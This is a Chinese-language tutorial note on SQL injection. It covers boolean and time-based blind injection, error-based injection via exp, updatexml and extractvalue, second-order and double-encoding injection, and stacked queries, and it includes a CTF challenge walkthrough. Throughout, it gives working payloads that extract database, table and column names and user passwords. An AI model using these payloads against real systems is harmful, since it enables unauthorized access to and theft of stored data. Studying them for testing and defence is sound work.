# sql注入--盲注&报错&二次&堆叠

盲注就是在sql注入过程中，sql语句执行select之后，可能由于网站代码的限制或者apache等解析器配置了不回显数据，造成在select数据之后不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个判断的过程称之为盲注。

通俗的讲就是在前端页面没有显示位，不能返回sql语句执行错误的信息，输入正确和错误返回的信息都是一致的，这时候我们就需要使用页面的正常与不正常显示来进行sql注入。

盲注的优缺点

优点：不需要显示位和出错信息。

缺点：速度慢，耗费时间长（可以用到bp等工具）。

## 盲注--布尔

### 条件：

- 没有返回SQL执行的错误信息
- 错误与正确的输入，返回的结果只有两种

### 使用布尔类型盲注的操作步骤：

1. 构造目标查询语句
2. 选择拼接方式
3. 构造判断表达式
4. 提取数据长度
5. 提取数据内容

### 操作

使用函数去猜解字符。

eg:length((select database()))=7

如果数据库名1长度大于7，那么就会返回正确的页面，基于这个思路使用函数去暴力猜解库名，表名，列名，数据，因为极其麻烦因此实际中会使用bp或自己写脚本。

> substr((select database()),1,1)='a'--+
>
> substr为截取字符串函数，第一个参数为我们的SQL语句，第二个参数1表示从第一个字符开始，第三个参数表示截取一个字符。并且该字符为a。

### 其他函数

#### left()函数：

语法：left (string,n) string为要截取的字符串，n为长度。

payload：name=lili' and left((select database()),1)='p'--+

#### mid()函数：

语法：mid(string, start[, length]) column_name为要提取字符的字段，start为开始截取位置(起始值是1)，length为截取的长度(可选，默认余下所有字符)

char(x)函数：将x的值转为所对应的字符

payload：name=lili' and mid((select database()),1,1)=char(112)--+

#### 正则表达式 regexp : 

正则表达式语法： regexp ^[a-z] 表示字符串中第一个字符是在 a-z范围内。regexp ^a 表示字符串第一个字符是a。regexp ^ab 表示字符串前两个字符是ab。

payload:name=lili' and  (select database()) regexp '^p'--+ 

#### like函数：

语法：Like 'a%'表示字符串第一个字符是a。

​      Like 'ab%'表示字符串前两个字符是ab。

%表示为任意值

payload：name=lili' and  (select database()) like 'p%'--+

#### if语句 ：

语法：if(判断条件，正确返回的值，错误返回的值)

注意数据库中的if与后端if不一样

payload：name=lili' and 1= if(((select database())like 'p%'),1,0)--+ 

表示如果if语句中的第一个参数为真，则输出第一个值1，不为真输出第二个值0；

## 盲注--延时

### 条件：

1. 页面上没有显示位和SQL语句执行的错误信息

2. 正确执行和错误执行的返回界面一样

   此时需要使用时间类型的盲注。

   时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上使用IF语句加入延时语句来构造，由于时间型盲注耗时较大，通常利用脚本工具来执行，在手工利用的过程中较少使用。

### 注意事项

      1. 通常使用sleep()等专用的延时函数来进行时间盲注，特殊情况下也可以使用某些耗时较高的操作代替这些函数。
      2. 为了提高效率，通常在表达式判断为真时执行延时语句。
      3. 时间盲注语句拼接时无特殊要求，保证语法正确即可。

### 操作

1. 通过时间线判断sql语句是否执行（借助bp，网页时间无法判断是因为语句执行还是网络延迟）

2. 通过添加sleep函数判断：payload：name=lili'and sleep(5)--+  执行成功时间线为5s

3. 通过时间盲注获取当前数据库

   第一步：

   首先需要获取数据库长度

   payload：name=lili'and if(length((select database()))=7,sleep(5),0)--+

   根据时间线判断可知数据库的字符长度为7

   第二步：

   获取当前数据库的库名

   payload：name=lili'and if(substr((select database()),1,1)='p',sleep(5),0)--+

   根据时间线判断当前数据库的库名的第一个符为‘p’

   也可以使用上边布尔类型盲注的其他函数执行。

## 报错注入

> 基于报错的信息获取------三个常用的用来报错的函数
>
> - updatexml() :函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。
>   extractvalue():函数也是MYSQL对XML文档数据进行查询的XPATH函数。
>   floor(): MYSQL中用来取整的函数。

### 什么是报错注入？

报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。简单点说，就是在可以进行sql注入的位置，调用特殊的函数执行，利用函数报错使其输出错误结果来获取数据库的相关信息

### 报错注入的种类：

1.BigInt数据类型溢出

2.函数参数格式错误

3.主键冲突（重复）

### BigInt数据类型溢出：

exp(int)函数返回e的x次方，当x的值足够大的时候就会导致函数的结果数据类型溢出，也就会因此报错："DOUBLE value is out of range"

例：

?id=1" and exp(~(select * from (select user())a)) --+
先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a

然后在查询select * from a 查询a，将结果集a全部查询出来

查询完成，语句成功执行，返回值为0，再取反(~按位取反运算符)，exp调用的时候e的那个数的次方，就会造成BigInt大数据类型溢出，就会报错

payload：

获取表名：

?id=1" and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a)) --+
获取列名：

?id=1" and exp(~(select * from (select column_name from information_schema.columns where table_name='users' limit 0,1)a)) --+
获取列名对应信息：

?id=1" and exp(~(select * from(select username from 'users' limit 0,1))) --+
适用mysql数据库版本是：5.5.5~5.5.49

**除了exp()函数之外，pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入**

### 函数参数格式错误：

两个重要函数：updatexml（） extractvalue ()

我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错

**updatexml()函数语法：updatexml(XML_document,Xpath_string,new_value)**

XML_document:是字符串String格式，为XML文档对象名称

Xpath_string:Xpath格式的字符串

new_value:string格式，替换查找到的符合条件的数据

> updatexml(xml_doument,XPath_string,new_value)
> 第一个参数：XML的内容
> 第二个参数：是需要update的位置XPATH路径
> 第三个参数：是更新后的内容
> 所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式
> 函数利用和语法明白了，下面注入的payload就清楚明白
>
> 
>
> updatexml函数最多输出32个字节。这个时候md5解密是解不出来的，因为~的存在占据一位，密文只有31位，所以substring函数作用就出来了。
>
> 这个函数，一个是要截取的内容，一个是开始的位数substring(xx,xx)
>
> 构造payload:kobe' and updatexml(1,concat(0x7e,substring((select password from users limit 0,1), 32)),0)#



查询当前数据库的用户信息以及数据库版本信息:

?id=1" and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+

> 如何让全部的数据都校验失败呢？ 恩，就是使用concat在需要的数据前面加上一个XPATH校验失败的东东就可以了。--于小葵
> 0x7e用来校验，version()是我们想要的数据，concat用来连接它们两个
>
> 0x7e这个东西，它是 ~ 的16进制用来校验，但也不用被0x7e固定化了，只要能做到校验那填什么都可以

获取当前数据库下数据表信息：

?id=1" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+

获取users表名的列名信息：

?id=1" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),3) --+

获取users数据表下username、password两列名的用户字段信息:

?id=1" and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+

?id=1" and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+

extractvalue()函数语法:extractvalue(XML_document,XPath_string)

获取当前是数据库名称及使用mysql数据库的版本信息：

?id=1" and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+

获取当前位置所用数据库的位置：

?id=1" and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+

获取表名：

?id=1" and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+

获取users表的列名：

?id=1" and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e)) --+

获取对应的列名的信息(username/password):

?id=1" and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+

### 主键冲突（重复）:(会的不多，以后用上了再说)

主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()

利用 select count(*),(floor(rand(0)*2)) x from users group by x这个相对固定的语句格式，导致的数据库报错



## 二次注入&二次编码

### 二次注入

#### 介绍：

简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
网站对我们输入的一些重要的关键字进行了转义，但是这些我们构造的语句已经写进了数据库，可以在没有被转义的地方使用

可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。

> sql二次注入，恶意SQL语句本身被过滤不被执行，但存储的还是完整的语句，查看的时候重新调用该语句，但程序没有进行过滤的话，恶意的语句就会被执行

#### 方法

二次注入常见于需要执行插入（insert），更新（update）操作的业务逻辑中

例如，忘记密码

> 小迪--
>
> 找回密码应用功能：
>
> 我们登陆了一个用户，在用户的界面上有找回密码的功能
>
> 找回密码：
>
> 得到你的用户名（你找回要谁的密码）
>
> 没有登陆用户，我点找回密码，是不是先要输入你要找的目标
>
> 绕过登陆了用户，一般网站就直接进入验证过程（知道你是谁了）
>
> 接受获取你的用户名，修改密码（查询方式：update)
>
> 绕过我在注册用户名的时候，写的是一个SQL注入的语句呢？
>
> UPDATE user SET password'xiaodi'WHERE username='SQL注入代a码

在让用户填写信息时,我们写入恶意的sql注入代码,当代码作为一个值被其他没有过滤的功能拼接到sql语句中执行时,就有可能触发该漏洞.

### 二次编码注入

原理：

当我们输入%2527的时候，浏览器会 将%25转义为%，之后不再进行编码，所以最后成为了%27，最后让浏览器进行载一次编码，就注入了’ ，之后就可以进行注入了。(%27==')

方法:
在注入点后键入%2527,然后按照正常的注入流程开始注入
测试方法
黑盒测试
在可能的注入点后键入%2527，之后进行注入测试
白盒测试
1.是否使用urldecode函数
2.urldecode函数是否在转义方法之后

## 堆叠注入

### 语法介绍：

版本：

​	可以影响几乎所有的关系型数据库

原理：

​	将多条语句堆叠在一起进行查询，且可以执行多条SQL语句

​	语句之间以分号(;)隔开，其注入攻击就是利用此特点，在第二条语句中构造payload

优势：

​	联合查询union也可拼接语句（有局限性）

​	但是堆叠注入能注入任意语句

局限：

​	利用mysqli_multi_query()函数就支持多条sql语句同时执行

​	但实际情况中，PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行

```php
mysqli_query()函数:
mysqli_query($connection, $query);
//$connection：表示与MySQL服务器的连接，可以通过mysqli_connect()函数进行创建。
//$query：表示要执行的SQL查询语句。
```



### 使用：

有注入点：即存在sql注入漏洞

未过滤：即未对";"号进行过滤

未禁用：即未禁止执行多条sql语句

**例子**:
“强网杯2019随便注”

已知：words表能回显内容，`1919810931114514` 表不能回显具体内容，select被过滤了

```sql
 1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flagid` VARCHAR(100) ;show columns from words;#
```


​		1、堆叠注入

';    开始堆叠

RENAME TABLE wordsTOwords1;   将名为words的表重命名为words1

RENAME TABLE 1919810931114514TOwords;  将名为1919810931114514的表重命名为words

ALTER TABLE wordsCHANGEflag id VARCHAR(100);   更改words表中名为flag的列的名称为id，并将其数据类型更改为VARCHAR(100)（最大长度为100个字符）

SHOW COLUMNS FROM words;   显示words表的所有列以及其属性和信息

注释掉代码的剩余部分

2、堆叠注入+select编码绕过

```sql
;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#将语句进行十六进制编码后赋值给a,然后执行a
```

